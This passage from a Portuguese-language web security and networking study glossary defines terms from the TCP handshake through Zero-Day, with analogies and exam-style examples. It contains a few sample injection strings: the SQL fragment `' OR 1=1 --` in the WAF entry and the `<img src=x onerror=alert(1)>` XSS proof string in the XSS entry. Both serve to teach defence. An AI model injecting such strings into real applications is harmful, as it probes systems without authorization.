- **Explicação simples**: É administrar o servidor gritando o usuário e a senha em um megafone aberto no meio da rua: funciona para mandar o comando, mas qualquer pessoa com um gravador no quarteirão copia a sua senha inteira.
- **Exemplo de utilização**: Embora o *servidor* Telnet na porta 23 seja proibido em produção por insegurança, administradores às vezes usam o comando cliente (ou preferencialmente `nc -zv` / `Test-NetConnection`) apenas para testar se uma porta TCP qualquer está respondendo ao handshake.

##### Three-Way Handshake (Aperto de Mão de Três Vias)
- **Nome**: TCP Three-Way Handshake (Aperto de Mão de Três Vias do TCP — RFC 9293).
- **Significado**: Procedimento obrigatório de 3 mensagens usado pelo protocolo **TCP** para estabelecer uma conexão ativa (`ESTABLISHED`) antes que qualquer dado da aplicação (como o handshake TLS ou uma requisição HTTP) possa ser transmitido:
  1. **`SYN` (Cliente $\rightarrow$ Servidor)**: o cliente envia um segmento com a flag `SYN=1` e escolhe um número de sequência inicial aleatório $x$ (`Seq = x`).
  2. **`SYN-ACK` (Servidor $\rightarrow$ Cliente)**: o servidor responde com as flags `SYN=1` e `ACK=1`, confirmando o recebimento do `SYN` do cliente somando 1 ao número dele (**`Ack = x + 1`**) e enviando seu próprio número de sequência inicial aleatório $y$ (`Seq = y`).
  3. **`ACK` (Cliente $\rightarrow$ Servidor)**: o cliente responde com a flag `ACK=1`, número de sequência `Seq = x + 1` e confirmação **`Ack = y + 1`**. A conexão entra no estado `ESTABLISHED` em ambos os lados.
- **Explicação simples**:
  1. Cliente: "Olá servidor, quero conversar; começo a contar minhas frases a partir do número 100 (`SYN, Seq=100`)."
  2. Servidor: "Recebi seu 100 e espero sua frase 101 (`ACK=101`). Eu também topo conversar e começo minhas frases no número 500 (`SYN, Seq=500`)."
  3. Cliente: "Combinado, recebi seu 500 e espero sua frase 501 (`ACK=501`)."
- **Exemplo de utilização**: Questão clássica de prova: *"Se o cliente envia `SYN` com `Seq=400` e o servidor responde `SYN-ACK` com `Seq=900`, quais serão os valores de `Ack` no passo 2 e no passo 3?"* Resposta: No passo 2 (`SYN-ACK`), **`Ack = 401`**; no passo 3 (`ACK`), **`Seq = 401` e `Ack = 901`**.

##### Throttling (Limitação de Rede no Chrome DevTools)
- **Nome**: Network Throttling (Simulação de Limitação de Banda e Latência na aba Network do Chrome DevTools).
- **Significado**: Funcionalidade integrada na barra superior da aba [Network](./02a-devtools-network.md#s2-1) (e na aba *Performance*) do Chrome DevTools que emula condições de rede mais lentas ou instáveis (como **Fast 4G**, **Slow 4G**, **3G**, **Offline** ou perfis personalizados com limites específicos de *Download*, *Upload* em kbit/s e *Latency* em ms) diretamente no navegador. Permite testar o comportamento da aplicação sob alta latência (TTFB elevado), verificar se o Service Worker entra em ação no modo **Offline** e observar em câmera lenta estados intermediários de carregamento, redirecionamentos ou condições de corrida de interface (como um usuário clicando várias vezes no botão "Pagar" enquanto a primeira requisição ainda está em trânsito).
- **Explicação simples**: É um "simulador de internet ruim" no computador do desenvolvedor: mesmo conectado na fibra óptica de 1 Gbps do escritório, você liga o *Throttling* em `3G` ou `Offline` para ver como o seu site se comporta no celular de um cliente dentro do metrô.
- **Exemplo de utilização**: Na barra de controles da aba **Network**, clique no menu suspenso **No throttling** (ao lado de *Disable cache*) e selecione **Slow 4G** ou **Offline**.

##### Token (Token de Autenticação / Sessão / Refresh)
- **Nome**: Token de Segurança (Access Token, Refresh Token, Session Token, Anti-CSRF Token).
- **Significado**: Artefato digital (string opaca gerada por CSPRNG — *Cryptographically Secure Pseudo-Random Number Generator* — ou estrutura assinada como um **JWT**) emitido pelo servidor para representar uma sessão autenticada, uma concessão de permissão temporária ou uma prova de intenção. Na arquitetura moderna de aplicações web, destacam-se:
  - **Session Token (Opaco)**: string aleatória de alta entropia (mínimo 128 bits) sem significado intrínseco, cuja validade é consultada no banco/cache de sessões do servidor; armazenada em cookie `HttpOnly; Secure; SameSite`.
  - **Access Token (Curta Duração)**: credencial (frequentemente JWT com expiração curta de 5 a 15 minutos) apresentada no header `Authorization: Bearer <token>` para acessar APIs.
  - **Refresh Token (Longa Duração)**: credencial opaca de longa duração armazenada de forma estritamente protegida (cookie `HttpOnly; Secure; Path=/api/auth/refresh`) usada exclusivamente para obter um novo *Access Token* quando o anterior expira, implementando **rotação de Refresh Token** (*Refresh Token Rotation*) e detecção de reuso.
- **Explicação simples**: O *Refresh Token* é o seu passaporte guardado trancado no cofre do hotel (`HttpOnly`); o *Access Token* é o passe diário com validade de 15 minutos que você leva na mão para entrar nos parques. Se alguém roubar seu passe de 15 minutos, ele logo vence; e seu passaporte principal nunca fica exposto na rua.
- **Exemplo de utilização**: Envio de um *Access Token* no cabeçalho padrão de autorização HTTP (RFC 6750):
  ```http
  Authorization: Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9...
  ```

##### TTL (Time to Live — IP e DNS)
- **Nome**: TTL (*Time to Live* — Tempo de Vida em Pacotes IP e em Registros DNS).
- **Significado**: Sigla fundamental que possui **dois significados distintos e muito cobrados em provas**, dependendo da camada:
  1. **No Cabeçalho IP (Camada 3 — IPv4 `TTL` / IPv6 `Hop Limit`)**: campo de 8 bits (valor de `0` a `255`, ex.: `64` no Linux ou `128` no Windows) que limita a **quantidade máxima de saltos (*hops* / roteadores)** que um pacote IP pode atravessar antes de ser descartado. **Não é medido em segundos na prática atual, mas em saltos**: cada roteador pelo qual o pacote passa subtrai `1` do TTL (`TTL = TTL - 1`). Se o TTL chegar a `0`, o roteador descarta o pacote e envia uma mensagem **ICMP Time Exceeded** de volta à origem, impedindo que pacotes perdidos fiquem circulando eternamente em loops de roteamento.
  2. **No Sistema DNS (Camada 7)**: valor numérico expresso em **segundos** (ex.: `300` = 5 minutos, `86400` = 24 horas) definido em cada registro DNS (`A`, `AAAA`, `CNAME`, `TXT`) que informa aos resolvedores recursivos e ao navegador por quanto tempo eles podem guardar aquela resposta no cache antes de consultar novamente o servidor DNS autoritativo.
- **Explicação simples**: No **pacote IP**, o TTL é um cartão de vale-transporte com 64 passagens: a cada catraca de roteador que o pacote passa, gasta 1 passagem; se zerar, o pacote é retirado da pista para não causar engarrafamento infinito. Já no **DNS**, o TTL é o prazo de validade em segundos da anotação na agenda telefônica.
- **Exemplo de utilização**: A ferramenta `traceroute` (ou `tracert` no Windows) descobre todos os roteadores do caminho enviando pacotes com `TTL=1`, depois `TTL=2`, `TTL=3`... e lendo os endereços IP dos roteadores que devolvem o aviso *ICMP Time Exceeded* em cada salto!

##### TTFB (Time To First Byte)
- **Nome**: TTFB (*Time To First Byte* — Tempo até o Primeiro Byte).
- **Significado**: Métrica fundamental de performance web e de rede que mede o tempo decorrido entre o momento em que o cliente envia a requisição HTTP e o momento em que recebe o **primeiro byte da resposta** (o início dos cabeçalhos HTTP) vindo do servidor. Na aba [Network > Timing](./02a-devtools-network.md#s2-1) do Chrome DevTools, a fase rotulada especificamente como **`Waiting for server response`** representa o núcleo do TTFB (o intervalo entre o fim de `Request sent` e o início de `Content download`), enquanto a métrica global de TTFB em ferramentas de Web Vitals engloba o tempo total desde o início da navegação até o primeiro byte. Um **TTFB alto** (ex.: > 600 ms ou vários segundos) indica gargalo no **processamento do servidor back-end** (consultas SQL lentas sem índice, chamadas síncronas a APIs externas, sobrecarga de CPU) ou alta **latência física de rede** até o servidor de origem (mitigável com cache e CDN).
- **Explicação simples**: Em um restaurante, *Request sent* é o tempo de você falar o pedido ao garçom; **TTFB (*Waiting for server response*)** é o tempo que a cozinha leva preparando o prato lá dentro até o garçom colocar a primeira bandeja na sua mesa; e *Content download* é o tempo de passar todos os pratos da bandeja para a mesa.
- **Exemplo de utilização**: Na aba **Network > Timing**, se uma requisição de 2 KB leva `2.400 ms` no total, sendo `Waiting for server response: 2.380 ms` e `Content download: 2 ms`, o problema **não é o tamanho do arquivo nem a velocidade de download da internet do usuário**, mas sim lentidão no processamento do back-end/banco de dados.


---

<a id="s8-u"></a>
### 8.21 Letra U

##### UDP (User Datagram Protocol)
- **Nome**: UDP (*User Datagram Protocol* — Protocolo de Datagrama de Usuário — RFC 768).
- **Significado**: Protocolo minimalista da **Camada de Transporte (Camada 4)** cuja PDU é o **Datagrama**. Ao contrário do TCP, o UDP é **não orientado a conexão** (*connectionless* — não realiza handshake prévio antes de enviar dados), **não confiável** (não envia confirmações `ACK` nem retransmite pacotes perdidos), **não garante entrega ordenada** e **não possui controle de fluxo ou de congestionamento** nativos na camada UDP, apresentando um cabeçalho fixo mínimo de apenas **8 bytes** (Porta de Origem, Porta de Destino, Comprimento e Checksum). Essa ausência de sobrecarga confere ao UDP **baixíssima latência** e elimina o atraso de retransmissão, tornando-o ideal para **consultas DNS (porta 53 UDP)**, **DHCP (portas 67/68 UDP)**, **streaming de áudio/vídeo em tempo real e chamadas VoIP/WebRTC**, jogos online e como base para o protocolo **QUIC / HTTP/3 (porta 443 UDP)** (que implementa confiabilidade e criptografia próprias no espaço de usuário). Do ponto de vista de segurança, serviços UDP abertos (DNS, NTP, Memcached) são frequentemente abusados em ataques de **Amplificação e Reflexão DDoS** com *IP Spoofing* (veja [Redes de Computadores](./04-redes-de-computadores.md#s4)).
- **Explicação simples**: Enquanto o TCP é uma carta registrada com aviso de recebimento e numeração de páginas, o **UDP** é uma transmissão de rádio ao vivo ou entrega de panfleto: o remetente dispara os pacotes na velocidade máxima sem parar para perguntar se chegou; se falhar 1 milissegundo de áudio na chamada de vídeo, é melhor seguir em frente com a fala atual do que travar o vídeo inteiro para repetir a sílaba perdida.
- **Exemplo de utilização**: Resumo comparativo cobrado em provas:
  ```text
  TCP = Orientado a conexão (Handshake) | Confiável (ACK/Retransmissão) | Ordenado | Cabeçalho 20–60 bytes
  UDP = Sem conexão (Sem Handshake)     | Melhor esforço (Sem ACK)      | Sem ordem| Cabeçalho 8 bytes fixos
  ```

##### URL (Uniform Resource Locator — e URI)
- **Nome**: URL (*Uniform Resource Locator* — Localizador Uniforme de Recursos) e URI (*Uniform Resource Identifier* — Identificador Uniforme de Recursos — RFC 3986 / WHATWG URL Standard).
- **Significado**: Uma **URI** é qualquer cadeia de caracteres padronizada que identifica um recurso abstrato ou físico; uma **URL** é o subconjunto mais comum de URI que, além de identificar o recurso, especifica **como e onde localizá-lo na rede** informando o mecanismo de acesso (esquema/protocolo) e o endereço de rede. A anatomia completa de uma URL é composta por:
  `esquema://usuario:senha@host:porta/caminho/recurso?query=string#fragmento`
  *(sendo o uso de `usuario:senha@` na URL depreciado e bloqueado por segurança).*
  - **`esquema` (`protocol`)**: `https`, `http`, `wss`, `mailto`.
  - **`host` (`hostname`)**: nome de domínio (`loja.exemplo.test`) ou endereço IP (`192.0.2.1` ou `[2001:db8::1]`).
  - **`porta` (`port`)**: porta TCP/UDP (implícita `443` para HTTPS e `80` para HTTP). A combinação `esquema + host + porta` define a **Origem (`Origin`)**.
  - **`caminho` (`pathname`)**: rota hierárquica do recurso no servidor (`/api/v1/produtos`).
  - **`query string` (`search`)**: parâmetros iniciados por `?` enviados ao servidor.
  - **`fragmento` (`hash`)**: âncora iniciada por `#` (`#secao-2`), que é **processada exclusivamente no navegador (cliente)** e **nunca é enviada ao servidor** na requisição HTTP!
- **Explicação simples**: A URI é como o número de CPF ou ISBN de um livro (identifica quem ele é); a **URL** é o endereço completo dizendo em qual biblioteca, andar, corredor e prateleira você deve ir para pegar esse livro na mão.
- **Exemplo de utilização**: Decompondo uma URL com a classe nativa `URL` no [Console](./02c-devtools-console.md#s2-3) do DevTools:
  ```javascript
  const u = new URL('https://loja.exemplo.test:8443/busca?item=livro#avaliacoes');
  console.log(u.origin);   // "https://loja.exemplo.test:8443"
  console.log(u.pathname); // "/busca"
  console.log(u.search);   // "?item=livro"
  console.log(u.hash);     // "#avaliacoes" (não vai para o servidor na requisição HTTP!)
  ```

##### User-Agent (Cabeçalho HTTP e Client Hints `Sec-CH-UA`)
- **Nome**: `User-Agent` (Cabeçalho HTTP de Identificação do Agente de Usuário — RFC 9110) e *User-Agent Client Hints* (`Sec-CH-UA`).
- **Significado**: Header de requisição HTTP enviado pelo cliente (navegador web, aplicativo móvel, utilitário CLI como `curl` ou robô indexador/*crawler*) informando ao servidor características do software cliente, motor de renderização e sistema operacional. Para reduzir o rastreamento passivo de usuários (*Browser Fingerprinting*), o Google Chrome implementou a **Redução do User-Agent (*User-Agent Reduction*)**, congelando informações detalhadas na string `User-Agent` clássica e migrando para os cabeçalhos modernos **`Sec-CH-UA`**, `Sec-CH-UA-Mobile` e `Sec-CH-UA-Platform`. **Regra de segurança**: o cabeçalho `User-Agent` é controlado inteiramente pelo cliente e pode ser alterado com dois cliques na aba **Network conditions** do Chrome DevTools; portanto, **jamais deve ser usado como controle de segurança ou autenticação**, e se for gravado em logs ou exibido em painéis administrativos, deve ser devidamente sanitizado/escapado contra **XSS** e **SQL Injection**.
- **Explicação simples**: É o cartão de visitas em que o navegador diz "Olá, sou o Google Chrome rodando no Windows". Como qualquer pessoa pode imprimir um cartão de visitas falso em casa (ou mudar na aba *Network conditions* do DevTools), o servidor nunca deve confiar nele para liberar acesso restrito.
- **Exemplo de utilização**: No Chrome DevTools, abra o menu `⋮ > More tools > Network conditions`, desmarque **Use browser default** em *User agent* e escolha outro dispositivo ou digite um valor personalizado para testar como o servidor reage.

---

<a id="s8-v"></a>
### 8.22 Letra V

##### VPN (Virtual Private Network)
- **Nome**: VPN (*Virtual Private Network* — Rede Privada Virtual).
- **Significado**: Tecnologia de segurança de rede que estabelece um **túnel criptografado e autenticado** sobre uma rede pública não confiável (como a Internet), estendendo logicamente uma rede privada corporativa para dispositivos remotos (*Remote Access VPN* — ex.: funcionário em home office conectando-se à matriz) ou interligando duas matrizes/filiais (*Site-to-Site VPN*). Utiliza protocolos como **IPsec** (Camada 3, padrão em túneis Site-to-Site corporativos), **WireGuard** (moderno, enxuto e de alta performance sobre UDP) ou **OpenVPN** (sobre TLS/UDP ou TCP). Ao conectar-se à VPN corporativa, o dispositivo recebe um endereço IP virtual pertencente à rede interna da empresa, permitindo acessar recursos internos restritos (como servidores SSH na porta 22, bancos de dados ou intranets) sem expô-los na Internet pública. Divide-se em **Full Tunnel** (todo o tráfego do usuário, inclusive acesso à Internet geral, passa pelo túnel da empresa) e **Split Tunnel** (apenas o tráfego destinado às sub-redes internas da empresa entra no túnel criptografado).
- **Explicação simples**: É construir um tubo subterrâneo blindado e particular por baixo das ruas públicas da cidade, ligando a sala da sua casa diretamente ao corredor interno do escritório da empresa: para os computadores lá de dentro, é como se você estivesse sentado em uma mesa dentro do próprio prédio.
- **Exemplo de utilização**: Acesso seguro a um banco de dados ou servidor SSH interno (`10.20.30.40:22`) que possui regra de firewall bloqueando toda a Internet pública e aceitando conexões exclusivamente da sub-rede da VPN (`10.8.0.0/24`).

---

<a id="s8-w"></a>
### 8.23 Letra W

##### WAF (Web Application Firewall)
- **Nome**: WAF (*Web Application Firewall* — Firewall de Aplicação Web).
- **Significado**: Firewall especializado que opera na **Camada de Aplicação (Camada 7 do modelo OSI)**, posicionado como um Proxy Reverso na frente dos servidores web e APIs (em nuvem/CDN, como Cloudflare WAF e AWS WAF, ou como módulo no servidor, como OWASP ModSecurity / Coraza com regras **CRS — Core Rule Set**). Diferentemente de um firewall de rede tradicional (que enxerga apenas IPs e portas de Camadas 3 e 4 e precisa deixar a porta `443` aberta para que o site funcione), o WAF decifra e inspeciona o conteúdo semântico de cada requisição HTTP/HTTPS — URL, query string, cabeçalhos, cookies e corpo JSON/formulário — para detectar e bloquear padrões de ataques da camada web, como **SQL Injection (SQLi)**, **Cross-Site Scripting (XSS)**, **Command Injection**, **Path Traversal**, *scanners* automatizados e abuso de taxa (**Rate Limiting**). **Importante para provas**: o WAF é uma excelente camada de **defesa em profundidade** e *virtual patching*, mas **não substitui a correção da vulnerabilidade no código-fonte** (como o uso de *Prepared Statements*).
- **Explicação simples**: O firewall tradicional (Camada 3/4) é o vigia do portão que deixa todo mundo entrar na loja pela porta 443 durante o horário comercial; já o **WAF (Camada 7)** é o segurança especializado que fica dentro da loja ouvindo o que cada cliente pede no balcão e expulsa na hora quem tenta falar códigos de arrombamento (`' OR 1=1 --` ou `<script>`).
- **Exemplo de utilização**: Na aba [Network](./02a-devtools-network.md#s2-1) do DevTools, quando um payload de teste em laboratório é bloqueado por um WAF antes de chegar à aplicação, o servidor geralmente retorna status **`403 Forbidden`** (ou `406 Not Acceptable`) acompanhado de uma página ou JSON contendo um *Ray ID* / *Request ID* do WAF.

##### Waterfall (Gráfico em Cascata na aba Network do DevTools)
- **Nome**: Waterfall Chart (Coluna de Cascata Temporal da Aba Network do Chrome DevTools).
- **Significado**: Representação visual gráfica em formato de barras horizontais exibida na última coluna da tabela de requisições da aba [Network](./02a-devtools-network.md#s2-1) do Chrome DevTools, que ilustra cronologicamente (da esquerda para a direita, em milissegundos) quando cada requisição foi iniciada, quanto tempo durou cada fase do seu ciclo de vida (**Queueing**, **Stalled**, **DNS Lookup**, **Initial connection**, **SSL**, **Request sent**, **Waiting for server response / TTFB** e **Content download**) e como as requisições se sobrepõem no tempo. Permite diagnosticar visualmente gargalos de serialização (escadinhas onde um recurso só começa depois que outro termina), bloqueio de fila HTTP/1.1 (*Stalled*), lentidão de back-end (barra verde/turquesa longa de TTFB) ou download pesado (barra azul longa de *Content download*).
- **Explicação simples**: É o cronograma visual (gráfico de Gantt) da construção da página: cada barra colorida mostra o segundo exato em que cada arquivo saiu para buscar dados, quanto tempo esperou na fila, quanto tempo o servidor demorou pensando e quando o download terminou.
- **Exemplo de utilização**: Passar o mouse sobre a barra colorida da coluna **Waterfall** em qualquer linha da aba Network abre instantaneamente o pop-up detalhado da aba **Timing** daquela requisição.

##### WebSocket (Protocolo `ws://` e `wss://`)
- **Nome**: WebSocket Protocol (Protocolo de Comunicação Bidirecional Persistente — RFC 6455).
- **Significado**: Protocolo da camada de Aplicação que fornece um canal de comunicação **full-duplex** (bidirecional simultâneo) e de baixa latência sobre uma única conexão TCP persistente entre o navegador e o servidor, permitindo que o servidor envie mensagens em tempo real para o cliente sem que o cliente precise fazer requisições repetidas (*polling*). Toda conexão WebSocket inicia-se como uma requisição HTTP/1.1 normal contendo os cabeçalhos **`Connection: Upgrade`** e **`Upgrade: websocket`**; se o servidor aceitar, responde com o status **`101 Switching Protocols`** e a conexão deixa de falar HTTP para trocar quadros (*frames*) WebSocket. Utiliza os esquemas **`ws://`** (sem criptografia, porta 80 — inseguro) e **`wss://`** (*WebSocket Secure* sobre TLS, porta 443 — **[REQUISITO]** em produção). **Cuidado de segurança**: o handshake inicial do WebSocket **não aplica a Same-Origin Policy da mesma forma que o `fetch()`**, portanto o servidor **deve validar obrigatoriamente o cabeçalho `Origin`** no momento do upgrade para prevenir ataques de **CSWSH** (*Cross-Site WebSocket Hijacking*).
- **Explicação simples**: No HTTP tradicional, o navegador precisa mandar uma carta a cada vez que quer saber se há novidade ("Tem mensagem nova? Não. Tem mensagem nova? Não."). O **WebSocket** usa uma primeira carta HTTP (`101 Switching Protocols`) para instalar um interfone direto sempre ligado entre navegador e servidor, onde qualquer um dos dois fala a qualquer instante.
- **Exemplo de utilização**: No Chrome DevTools, filtre por **`WS`** (ou **`Socket`**) na aba [Network](./02a-devtools-network.md#s2-1), clique na conexão com status `101` e abra a sub-aba **Messages** para inspecionar em tempo real cada mensagem enviada (seta verde $\uparrow$) e recebida (seta para baixo $\downarrow$).

---

<a id="s8-x"></a>
### 8.24 Letra X

##### X-Content-Type-Options (`nosniff`)
- **Nome**: `X-Content-Type-Options: nosniff` (Cabeçalho HTTP de Prevenção de MIME Sniffing — WHATWG Fetch Standard).
- **Significado**: Header de segurança de resposta HTTP cujo único valor válido é a diretiva **`nosniff`**. Instrui o navegador a **respeitar estritamente o tipo MIME declarado pelo servidor no cabeçalho `Content-Type`**, proibindo o navegador de tentar "adivinhar" (*sniff*) o formato do arquivo inspecionando seu conteúdo binário ou textual. Em particular, com `nosniff` ativo, o navegador recusa-se a executar um `<script>` se o `Content-Type` não for um MIME type JavaScript válido e recusa-se a aplicar uma folha `<link rel="stylesheet">` se o `Content-Type` não for `text/css`, além de impedir que arquivos de texto ou imagens enviados por usuários (`text/plain`, `image/png`) sejam renderizados como `text/html` (prevenindo **Stored XSS via Upload de Arquivos** — veja [Headers de Segurança](./05-headers-de-seguranca.md#s5)).
- **Explicação simples**: É um lacre oficial que diz ao navegador: "Confie única e exclusivamente na etiqueta `Content-Type` que eu colei por fora da caixa; se a etiqueta diz que é uma foto ou um texto simples, nunca tente executar isso como código HTML ou JavaScript".
- **Exemplo de utilização**: Cabeçalho obrigatório (**[REQUISITO]**) em todas as respostas HTTP de páginas, scripts e APIs:
  ```http
  X-Content-Type-Options: nosniff
  ```

##### X-Frame-Options (`DENY` e `SAMEORIGIN`)
- **Nome**: `X-Frame-Options` (Cabeçalho HTTP de Proteção contra Clickjacking — RFC 7034).
- **Significado**: Header de segurança de resposta HTTP criado para proteger páginas web contra ataques de **Clickjacking (UI Redressing)**, informando ao navegador se o documento atual pode ou não ser renderizado dentro de elementos `<frame>`, `<iframe>`, `<embed>` ou `<object>`. Possui dois valores padronizados ativos:
  - **`DENY`**: nenhuma página (nem mesmo do próprio domínio) pode carregar este documento dentro de um iframe.
  - **`SAMEORIGIN`**: apenas páginas pertencentes exatamente à **mesma origem** podem carregar este documento em um iframe.
  *(Nota histórica: a antiga diretiva `ALLOW-FROM uri` foi depreciada e não é suportada pelos navegadores modernos).* Nas aplicações atuais, a recomendação (**[RECOMENDAÇÃO]** / **[BOA PRÁTICA]**) é enviar a diretiva moderna **`Content-Security-Policy: frame-ancestors 'none'` (ou `'self'`)** em conjunto com `X-Frame-Options: DENY` (ou `SAMEORIGIN`) para máxima compatibilidade (em navegadores modernos, quando ambos estão presentes, `frame-ancestors` do CSP tem precedência — veja [Headers de Segurança](./05-headers-de-seguranca.md#s5)).
- **Explicação simples**: É uma cláusula de direito de imagem que proíbe outros sites de colocarem a sua página dentro de uma moldura (`<iframe>`) na vitrine deles para enganar os cliques dos seus clientes.
- **Exemplo de utilização**: Dupla de cabeçalhos de resposta para proteção completa contra Clickjacking:
  ```http
  X-Frame-Options: DENY
  Content-Security-Policy: frame-ancestors 'none';
  ```

##### XHR (`XMLHttpRequest`)
- **Nome**: XHR (`XMLHttpRequest` — API Clássica de Requisições Assíncronas AJAX — WHATWG XHR Standard).
- **Significado**: API histórica do navegador baseada em objetos e eventos (`onreadystatechange`, `onload`, `onerror`, `.open()`, `.send()`) que popularizou o paradigma **AJAX** (*Asynchronous JavaScript and XML*), permitindo atualizar partes de uma página web trocando dados com o servidor nos bastidores sem recarregar o documento inteiro. Apesar de ter a sigla "XML" no nome por razões históricas, transporta qualquer formato de dados, especialmente **JSON** e texto puro. Hoje a **Fetch API (`fetch()`)** é a alternativa moderna preferida por usar Promises nativamente, mas o `XMLHttpRequest` permanece amplamente utilizado por bibliotecas consolidadas (como *Axios*) e quando é necessário monitorar o progresso percentual de *upload* (`xhr.upload.onprogress`). No Chrome DevTools, tanto chamadas `fetch()` quanto `XMLHttpRequest` são agrupadas sob o filtro **`Fetch/XHR`** da aba [Network](./02a-devtools-network.md#s2-1).
- **Explicação simples**: É o precursor veterano do `fetch()`: faz exatamente o mesmo trabalho de buscar dados JSON no servidor sem recarregar a página, usando um estilo mais antigo de programação baseado em eventos.
- **Exemplo de utilização**: Na aba [Console](./02c-devtools-console.md#s2-3), ativar a engrenagem **Console settings > Log XMLHttpRequests** faz com que cada requisição XHR e `fetch()` concluída seja registrada automaticamente no log do Console.

##### XSS (Cross-Site Scripting — Refletido, Armazenado e DOM-Based)
- **Nome**: XSS (*Cross-Site Scripting* — Execução de Scripts Entre Sites — CWE-79, OWASP Top 10 Injection). *(A sigla usa "XSS" para não confundir com "CSS" de Cascading Style Sheets).*
- **Significado**: Vulnerabilidade crítica de segurança web na qual um atacante consegue injetar código **JavaScript** (ou marcação HTML maliciosa que dispara JavaScript, como `<img src=x onerror=...>`, `<svg onload=...>`, `<script>...</script>` ou URLs `javascript:...`) no contexto de uma aplicação confiável, fazendo com que o script malicioso seja executado **dentro do navegador de outros usuários** com acesso total àquela **Origem** (podendo ler o DOM da página, capturar teclas digitadas, ler `localStorage`/`sessionStorage`, ler `document.cookie` caso não seja `HttpOnly`, e disparar requisições `fetch()` autenticadas em nome da vítima). Divide-se em três tipos clássicos (muito cobrados em provas):
  1. **XSS Refletido (*Reflected / Non-Persistent XSS*)**: o payload malicioso vem na requisição HTTP atual (ex.: em um parâmetro de URL `?busca=<script>...`) e o servidor o inclui imediatamente na resposta HTML sem escapar; exige que a vítima clique em um link preparado.
  2. **XSS Armazenado (*Stored / Persistent XSS*)**: o payload malicioso é salvo de forma persistente no servidor (ex.: no banco de dados em um campo de comentário, nome de perfil, fórum ou arquivo SVG de upload) e é servido automaticamente para todos os usuários ou administradores que visualizarem aquela página. É o tipo mais severo.
  3. **XSS Baseado em DOM (*DOM-Based XSS*)**: a vulnerabilidade reside no **código JavaScript do cliente**, que lê dados de uma fonte não confiável (*source*, como `location.search`, `location.hash` ou `postMessage`) e os passa diretamente para um sumidouro inseguro do DOM (*sink*, como `element.innerHTML`, `document.write()` ou `eval()`), muitas vezes sem que o payload sequer passe pelo servidor.
  **Defesas primárias**: codificação de saída contextual (*Output Encoding* — `&lt;`, `&gt;`), uso de `textContent` em vez de `innerHTML`, sanitização com **DOMPurify** quando HTML rico for indispensável, e defesa em profundidade com **Content-Security-Policy (CSP)** e cookies **`HttpOnly`** (veja [Vulnerabilidades Web](./03a-vulnerabilidades-parte1.md#s3)).
- **Explicação simples**: É quando um invasor escreve uma ordem em JavaScript disfarçada de comentário ou nome de usuário, e o site imprime esse texto na tela dos outros clientes sem colocar "aspas de texto puro": o navegador da vítima acha que aquele script faz parte oficial do site do banco e executa todas as ordens do invasor.
- **Exemplo de utilização**: Diferença essencial entre código vulnerável a XSS e código seguro no front-end:
  ```javascript
  // INSEGURO: se input for "<img src=x onerror=alert(1)>", executa JS!
  divMensagem.innerHTML = entradaDoUsuario;

  // SEGURO [REQUISITO]: trata qualquer caractere "<" ou ">" exclusivamente como texto literal
  divMensagem.textContent = entradaDoUsuario;
  ```

---

<a id="s8-z"></a>
### 8.25 Letras Y e Z

##### YAML (YAML Ain't Markup Language)
- **Nome**: YAML (*YAML Ain't Markup Language* — Linguagem de Serialização de Dados Legível por Humanos).
- **Significado**: Formato textual de serialização de dados baseado em indentação por espaços, amplamente utilizado em arquivos de configuração de infraestrutura moderna (Docker Compose, Kubernetes, pipelines de CI/CD GitHub Actions/GitLab CI e especificações de APIs **OpenAPI / Swagger**). **Implicação de segurança**: em diversas linguagens (como Python `PyYAML`, Ruby e Java), funções antigas de carregamento padrão (como `yaml.load()` sem `SafeLoader`) permitiam instanciar objetos arbitrários da linguagem a partir de tags especiais no YAML, causando vulnerabilidades críticas de **Deserialização Insegura (CWE-502)** e execução remota de código (**RCE**). É **[REQUISITO]** utilizar sempre carregadores restritos como `yaml.safe_load()`.
- **Explicação simples**: É um formato de arquivo de configuração muito limpo que usa recuos de espaço em vez de chaves `{}` como o JSON; mas ao ler um YAML enviado por terceiros, o programa deve usar o modo de leitura segura (`safe_load`) para ler apenas dados, nunca comandos executáveis.
- **Exemplo de utilização**: Leitura segura de configuração YAML em Python prevenindo deserialização arbitrária:
  ```python
  import yaml
  # SEGURO [REQUISITO]: safe_load processa apenas tipos básicos seguros (dict, list, str, int)
  dados = yaml.safe_load(conteudo_yaml)
  ```

##### Zero Trust (Arquitetura de Confiança Zero)
- **Nome**: Zero Trust Architecture (ZTA — Arquitetura de Confiança Zero — NIST SP 800-207).
- **Significado**: Paradigma moderno de segurança da informação sintetizado pelo lema **"Nunca confie, sempre verifique"** (*"Never trust, always verify"*). Rompe com o antigo modelo de segurança baseado apenas em perímetro ("castelo e fosso", onde qualquer dispositivo que já estivesse dentro da rede local corporativa ou conectado na VPN era considerado automaticamente confiável) e assume que a rede interna já pode estar comprometida (*Assume Breach*). No modelo Zero Trust, **toda e qualquer requisição** — quer venha da Internet externa, quer venha de um servidor vizinho dentro do mesmo datacenter — deve ser continuamente **autenticada**, **autorizada** com privilégio mínimo, **criptografada** (mTLS/HTTPS interno) e validada quanto à postura de segurança do dispositivo antes de acessar qualquer recurso.
- **Explicação simples**: No modelo antigo ("castelo"), depois que você passava pela guarita da entrada, podia andar por todos os andares sem ninguém pedir documento. No **Zero Trust**, cada porta de cada sala interna tem um leitor biométrico próprio que confere seu crachá, sua autorização e o horário a cada passo, mesmo que você já esteja dentro do prédio.
- **Exemplo de utilização**: Uso de autenticação mútua TLS (**mTLS**) + validação de token JWT com escopo específico em chamadas internas entre microsserviços dentro do mesmo cluster privado.

##### Zero-Day (Vulnerabilidade de Dia Zero / 0-day)
- **Nome**: Zero-Day Vulnerability (Vulnerabilidade de Dia Zero / *0-day*).
- **Significado**: Falha de segurança em um software, sistema operacional, navegador ou protocolo que é descoberta e explorada (ou conhecida por terceiros) **antes que o fabricante/desenvolvedor tenha conhecimento dela ou tenha tido tempo ("zero dias") de desenvolver e publicar uma atualização de correção (*patch*)**. Justamente porque nenhuma versão do software é imune a um eventual *Zero-Day*, a engenharia de segurança exige **Defesa em Profundidade (*Defense in Depth*)** e **Isolamento (*Sandboxing*, CSP, COOP/COEP, sub-redes, menor privilégio)**: mesmo que uma falha inédita seja descoberta em uma biblioteca, as camadas adicionais de isolamento contêm o impacto do ataque.
- **Explicação simples**: É um defeito secreto no projeto de uma fechadura que um ladrão descobriu antes da fábrica: como a fábrica ainda não lançou a peça de reposição (*patch*), quem colocou alarme interno, câmera e grade na janela (defesa em profundidade) continua protegido mesmo se a fechadura ceder.
